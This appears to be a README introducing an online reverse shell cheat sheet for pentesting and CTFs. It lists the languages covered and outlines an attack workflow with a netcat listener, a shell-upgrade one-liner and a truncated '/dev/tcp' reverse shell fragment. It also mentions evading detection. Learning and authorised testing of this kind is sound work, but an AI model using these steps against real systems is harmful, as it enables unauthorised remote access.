# 💡 Shell Cheat Sheet – Swissky's InternalAllTheThings

🔗 [Shell Reverse Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

## 📂 What Is This?

This is a powerful and practical **Shell Reverse Cheat Sheet** curated by [Swissky](https://github.com/swisskyrepo), part of the famous **InternalAllTheThings** repository. It offers a **comprehensive collection of reverse shell payloads** for various programming languages and tools — useful for penetration testing, red teaming, and CTFs.

---

## 📜 What It Contains

The cheat sheet includes reverse shell payloads in multiple formats:

- 🐚 **Bash**
- 🐍 **Python**
- 💎 **Ruby**
- 🌐 **PHP**
- 🧑‍💻 **Perl**
- ☕ **Java**
- 🚀 **Node.js**
- 🧱 **Netcat (nc, ncat, openbsd-netcat)**
- 🔧 **Socat**
- 🏗️ **Awk**
- ⚙️ **PowerShell**
- 💣 **Xterm**
- 📬 **Telnet**
- 🐢 **C/C++ (compiled reverse shells)**

Each section provides:

- ✅ One-liner payloads
- ⚠️ Notes on limitations (e.g., `/dev/tcp` support)
- 🔁 Variants depending on listener or environment
- 🖥️ Compatibility for different OSs (Linux, Windows, macOS)

---

## 🔧 Use Cases

- ✅ **Bug Bounty & Pentesting**: Quickly gain shell access on a vulnerable service or web app.
- 🏆 **CTFs**: Instantly copy/paste working payloads during exploitation challenges.
- 🛠️ **Scripting Payloads**: Embed shell payloads in exploits or malware simulation tools.
- 🔬 **Learning & Training**: Understand how reverse shells work across languages and how to evade detection.

---

## 🚀 How To Use

1. **Pick the right payload** based on the target environment (e.g., PHP for RCE on webservers, nc for basic backconnects).
2. **Start a listener** on your attacker machine:
   ```bash
   nc -lvnp 4444
   ```
3. **Inject/execute the payload** on the target using available vectors (LFI, command injection, RCE).
4. **Get a shell**, upgrade it (e.g., with `python -c 'import pty;pty.spawn("/bin/bash")'`), and continue with enumeration/post-exploitation.

---

## 🧠 Pro Tip

Use it in combination with tools like:

- 🔍 [AutoFN](https://github.com/yourusername/autofn) (for recon + fuzzing)
- 🐍 [`pwncat`](https://github.com/cytopia/pwncat) (auto-upgrading shells)
- 🛡️ Firewalls bypass tricks (`bash -i >& /dev/tcp/...` with proxychains, tunneling)

---

## 📚 Related Resources

- [PayloadsAllTheThings – Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet)
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks – Reverse Shells](https://book.hacktricks.xyz/pentesting-web/shells)

---

## 🙏 Credits

Created and maintained by **[Swissky](https://github.com/swisskyrepo)** – a must-follow if you're in infosec.
